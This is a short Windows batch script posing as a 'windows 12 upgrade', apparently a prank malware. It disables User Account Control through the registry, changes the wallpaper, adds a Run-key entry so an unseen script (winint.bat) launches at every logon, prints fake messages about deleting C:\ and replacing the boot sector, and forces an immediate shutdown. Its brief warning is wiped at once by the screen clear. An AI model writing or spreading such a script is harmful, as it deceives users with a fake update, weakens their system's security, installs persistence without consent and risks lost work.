@echo off
title windows 12 upgrade
cls
echo Do you want to run this malware it may destory your pc do not run this im not responsible for any damages that were made to your computer 
cls
echo Are you sure!! pls run as administrator 

echo setup is now starting

reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f 

:: -------------------------------------------------------------------
:: 1. SET WALLPAPER (Located in C:\Users\<username>\Desktop\Folders\)
:: -------------------------------------------------------------------
set "WALLPAPER_PATH=%USERPROFILE%\Desktop\Folders\wallpaper.jpg"

:: Core Desktop Registry Keys
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%WALLPAPER_PATH%" /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v TranscodedImageCache /t REG_BINARY /d "" /f

:: Wallpaper Style (10 = Fill, 6 = Fit, 2 = Stretched, 0 = Centered)
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d "10" /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v TileWallpaper /t REG_SZ /d "0" /f

:: Legacy Shell Registry Cache
reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General" /v WallpaperSource /t REG_SZ /d "%WALLPAPER_PATH%" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General" /v Wallpaper /t REG_SZ /d "%WALLPAPER_PATH%" /f


:: -------------------------------------------------------------------
:: 2. ADD APP TO WINDOWS LOGON / SHELL STARTUP
:: -------------------------------------------------------------------
set "APP_NAME=MyDesktopApp"
set "APP_PATH=%USERPROFILE%\Desktop\Folders\winint.bat"

:: Write to User Run Registry Key (launches app when Shell loads at logon)
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "%APP_NAME%" /t REG_SZ /d "\"%APP_PATH%\"" /f

echo Deleting C:\
echo Replacing boot sector of windows 12 BYTES {17926} COMPLETED
echo the system has completed the setup updateing reg 
echo The operation completed successfully.
echo The operation completed successfully.
echo The operation completed successfully.
echo Success. Setup has been finished. Restarting now.
shutdown /s /f /t 0